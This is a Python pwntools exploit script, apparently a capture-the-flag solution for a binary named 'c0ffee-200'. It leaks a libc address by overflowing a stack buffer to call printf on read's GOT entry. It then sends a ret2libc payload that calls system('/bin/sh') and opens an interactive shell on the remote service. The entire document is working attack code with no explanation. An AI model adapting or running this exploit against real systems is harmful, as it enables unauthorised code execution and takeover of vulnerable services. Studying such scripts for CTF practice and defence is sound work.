from pwn import *
context(arch = 'i386', os = 'linux')
shellcode = asm(shellcraft.i386.linux.sh())

pop2ret		=0x08048d51#: pop edi; pop ebp; ret; 
printf_plt	=0x08048580
read_got	=0x0804B010

read_off	=0x000d5af0
system_off	=0x0003ada0
main		=0x08048920

#r=process('./c0ffee-200')
r=remote('127.0.0.1',9999)

padding="A"*8
name='A'*128


buf="A"*20
buf+=p32(printf_plt)
buf+=p32(main)
buf+=p32(read_got)

l=11
for i in range(l):
	print "Time",i
	if i==0:

		r.recvuntil('cups> ')
		r.sendline('1')
		print r.recv(1024)
	if i==l-1:
		print 'buf',buf
		r.sendline(str(len(buf)))
		r.sendline(buf)
		r.recvuntil('>> ')
		r.sendline(padding)
		r.recvuntil('> ')
		r.sendline('no')

		z=r.recv(1024)
		print "recv ",z
		print 'recv encode' ,z.encode('hex')
		addr=u32(z[221:221+4])


	else:
		r.sendline(str(len(name)))
		r.sendline(name)	
		r.recvuntil('>> ')
		r.sendline(padding)
		r.recvuntil('> ')
		r.sendline('yes')
		print "recv ",r.recv(1024).encode('hex')
	i+=1



print hex(addr),len(z[221:221+4])
libc=addr-read_off
system=libc+system_off

#libc_ = ELF('libc-2.23.so')			#Server Libc
libc_ = ELF('/lib/i386-linux-gnu/libc.so.6')    #Local Libc
binsh_off=next(libc_.search('/bin/sh\x00'))	#bin/sh string
binsh=libc+binsh_off

log.info("Libc:"+hex(libc))
log.info("system:"+hex(system))
log.info("binsh:"+hex(binsh))	

buf2="A"*20
buf2+=p32(system)
buf2+=p32(main)
buf2+=p32(binsh)

r.sendline('1')
l=11
for i in range(l):
	print "Time",i
	if i==l-1:
		print 'buf2',buf2
		r.sendline(str(len(buf2)))
		r.sendline(buf2)
		r.recvuntil('>> ')
		r.sendline(padding)
		r.recvuntil('> ')
		r.sendline('no')
		r.sendline('id')
		r.interactive()
	else:
		r.sendline(str(len(name)))
		r.sendline(name)	
		r.recvuntil('>> ')
		r.sendline(padding)
		r.recvuntil('> ')
		r.sendline('yes')
		print "recv ",r.recv(1024).encode('hex')
	i+=1

#r.interactive()

